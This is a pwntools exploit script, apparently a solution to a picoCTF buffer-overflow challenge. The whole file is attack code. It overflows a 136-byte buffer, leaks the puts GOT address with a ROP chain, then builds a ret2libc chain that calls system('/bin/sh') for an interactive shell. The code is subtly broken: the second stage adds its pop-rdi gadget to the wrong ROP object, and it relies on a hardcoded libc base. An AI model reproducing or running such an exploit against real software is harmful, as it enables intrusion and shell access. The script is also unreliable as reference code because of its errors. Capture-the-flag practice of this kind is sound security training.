from pwn import *


padding = b"a" * 136
local = ELF("vuln")
libc = ELF("libc.so.6")

# find libc base address
puts_plt = local.plt["puts"]
main_offset = local.symbols["main"]
puts_got = local.got["puts"]

log.info("puts plt: %s", hex(puts_plt))
log.info("main offset: %s", hex(main_offset))
log.info("puts got: %s", hex(puts_got))

# r = remote("mercury.picoctf.net", 62289)
r = process(["valgrind", "./vuln"])
rop_bl = ROP(local)
pop_rdi_g = (rop_bl.find_gadget(["pop rdi", "ret"]))[0]
log.info("pop rdi: %s", hex(pop_rdi_g))

rop_bl.raw(padding)
rop_bl.raw(p64(pop_rdi_g))
rop_bl.raw(p64(puts_got))
rop_bl.raw(p64(puts_plt))
rop_bl.raw(p64(main_offset))

log.info("payload: %s", rop_bl.dump())

r.sendline(rop_bl.chain())
r.interactive()


libc_base_addr = 0x7ffff7bd6000
system_addr = libc_base_addr + libc.sym["system"]
sh_addr = libc_base_addr + next(libc.search(b"/bin/sh"))
exit_addr = libc_base_addr + libc.sym["exit"]

log.info("libc base address: %s", hex(libc_base_addr))
log.info("address of system: %s", hex(system_addr))
log.info("address of /bin/sh: %s", hex(sh_addr))

rop = ROP(local)

rop.raw(padding)
rop_bl.raw(p64(pop_rdi_g))
rop.raw(p64(sh_addr))
rop.raw(p64(system_addr))

log.info("payload: %s", rop.dump())

# p = remote("mercury.picoctf.net", 62289)
p = process(["valgrind", "./vuln"])
p.sendline(rop.chain())
p.interactive()
